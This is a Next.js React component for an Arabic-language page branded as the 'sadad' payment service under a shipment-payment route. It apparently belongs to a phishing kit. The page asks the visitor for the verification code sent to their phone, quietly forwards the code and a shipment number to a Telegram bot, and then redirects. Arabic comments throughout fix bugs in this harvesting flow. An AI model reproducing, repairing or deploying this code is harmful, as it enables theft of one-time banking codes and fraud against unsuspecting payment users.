"use client"

import styles from './code.module.css'
import { useState } from 'react'
import { useRouter, useSearchParams } from 'next/navigation'
import TeleSned from '@/server/TeleSend' // تصحيح اسم الاستيراد

const Code = () => {
  const { Send } = TeleSned(); // تصحيح اسم الدالة
  const router = useRouter();
  const x = useSearchParams();
  const datas = x.get("names")
  const [form, setForm] = useState({
    data: {
      كود_الاول: "",
      رقم_الشحنة: datas
    }
  })
  
  const setDynamicFormData = (name, value) => {
    setForm({
      data: {
        ...form.data,
        [name]: value,
      }
    })
  }
  
  const PostToTelegram = () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("\n");
    Send(description)
  };
  
  const handleSubmit = (e) => {
    e.preventDefault();
    
    if(form.data.كود_الاول.trim() === "") { // استخدم === وأضف trim()
      alert('من فضلك قم بملء الحقول') // تصحيح إملائي
    } else {
      PostToTelegram(); // أرسل إلى Telegram أولاً
      router.push(`/fozajil/pay/code/finish?names=${datas}`) // ثم انتقل للصفحة التالية
    }
  }

  return (
    <div className={styles.contect}>
      <div>
        <div>
          <img src="" alt="sadad" />
          <img src="" alt="تنزيل png(4)" />
        </div>
        <h1> تاكيد</h1>
        <p>ادخال الكود المرسل حديثا على هاتفك</p>
     
        <form onSubmit={handleSubmit}> {/* استخدم دالة واحدة فقط */}
          <input 
            type="text" 
            name="كود_الاول" 
            onChange={(e) => {
              const { name, value } = e.target;
              setDynamicFormData(name, value);
            }} 
            placeholder="ادخل كود التحقق" 
            value={form.data.كود_الاول} // أضف value للتحكم
          />
        
          <button type='submit'>دخول</button> {/* إزالة onClick */}
        </form>
        <img src="" alt="footersadad" />
      </div>
    </div>
  )
}

export default Code
